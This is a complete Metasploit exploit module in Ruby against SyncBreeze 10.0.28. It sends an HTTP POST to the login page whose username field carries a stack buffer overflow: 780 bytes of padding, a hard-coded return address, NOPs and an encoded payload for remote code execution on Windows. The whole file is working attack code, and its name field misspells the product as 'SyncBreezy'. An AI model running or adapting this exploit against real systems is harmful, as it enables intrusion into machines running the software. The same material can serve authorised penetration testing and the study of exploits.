class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient
  
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SyncBreezy 10.0.28',
        'Description' => %q{
          Exploit for SyncBreezy
        },
        'License' => MSF_LICENSE,
        'Author' => ['CyberDen'],
        'Payload' => {
          'Space' => 500,
          'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d"
        },
        'DefaultOptions' => {
	  'EXITFUNC' => 'thread'
	},
        'Targets' => [
          [
            'SyncBreeze 10.0.28',
            {
              'Platform' => 'win',
              'Ret' => 0x10090c83,
              'Offset' => 780
            }
          ]
        ],
        'DisclosureDate' => '2024-10-15',
        'DefaultTarget' => 0,
      )
    )
  end

  def exploit

    uri = "/login"
    buf = rand_text_alpha(target['Offset'])
    buf += [ target.ret ].pack('V')
    buf += rand_text(4)
    buf += make_nops(10)
    buf += payload.encoded
    
    print_status('Sending request...')
    send_request_cgi(
      'method' => 'POST',
      'uri'    => uri,
      'vars_post'     => {
        'username' => "#{buf}",
        'password' => "pass123"
      }
    )
  end
end
